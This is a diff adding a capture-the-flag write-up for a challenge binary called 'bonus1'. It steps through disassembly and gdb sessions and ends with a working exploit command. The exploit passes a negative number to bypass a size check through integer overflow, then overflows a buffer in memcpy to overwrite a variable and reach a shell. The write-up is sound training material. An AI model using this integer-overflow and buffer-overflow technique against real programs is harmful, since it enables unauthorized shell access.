@@ -1,0 +1,78 @@
+- we run the program and we found that it takes 2 args and after doing some comparison it runs a shell with execl function taking /bin/sh as an argument.
+
+- We see the program call atoi with the first arg argv[1].
+
+0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+
+- And compare the return value from atoi to 0x9 = 9.
+
+0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
+0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
+// if the program is greather than 9, the program exit.
+
+- if it's less than 9, it compares it to this value 0x574f4c46 (1464814662) if this comparison is good, the shell will run.
+
+- the problem is how we can send a number less than or equal to 9 and its value is 0x574f4c46.
+
+- We see a call to memcpy function that we can overflow it. and multiply our arg to 4 and pass it as argument to memcpy.
+
+0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
+[...]
+0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+ 
+- The argument that memcpy take is:
+
+0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx // size_t n = retrurn value from atoi * 4
+0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx // src = argv[2]
+0x08048470 <+76>:	mov    DWORD PTR [esp],eax // a buffer = dest = we will overflow it
+
+- we tried with 9 (wich is 9 * 4 = 36) as argument and a buffer of AAA...:
+
+(gdb) r 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[Inferior 1 (process 3639) exited normally]
+
+- so 9 (the max number that we can try with it) is not enough for overflow.
+
+- We know that memcpy uses size_t (unsigned_int), so we can try with a negative number because it will be interpreted as a positive number whatever happens. So if we exceed the limit of the unsigned_int max we will back to 0.
+
+MAX of unsigned_int = 4294967295
+
+4294967295 / 4 + 1 = 1073741824
+
+- We will break at memcpy and examine our variable.
+
+(gdb) b *0x08048473
+Breakpoint 1 at 0x8048473
+(gdb) r -1073741824 AAAAAAAAAAAA
+Starting program: /home/user/bonus1/bonus1 -1073741824 AAAAAAAAAAAA
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) x/x $esp+0x8
+0xbffff278:	0x00000000
+
+- So now we have 0 as a value. now we will try to set 100 as a value.
+
+1073741824 - 25 = 1073741799
+
+(gdb) r -1073741799 AAAAAAAAAAAA
+Starting program: /home/user/bonus1/bonus1 -1073741799 AAAAAAAAAAAA
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) x/x $esp+0x8
+0xbffff278:	0x00000064 // = 100
+
+- Now we need to find the offset which we can overflow. for that, we will set a breakpoint after memcpy and examine our value.
+
+Starting program: /home/user/bonus1/bonus1 -1073741799 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Breakpoint 2, 0x08048478 in main ()
+(gdb) x/x $esp+0x3c
+0xbffff25c:	0x62413362
+
+- And we found that offset is 40. so now we need just to write this value (0x574f4c46) after the 40 chars.
+
+40 + 4 = 44 / 4 = 11
+1073741824 - 11 = 1073741813
+
+$ ./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
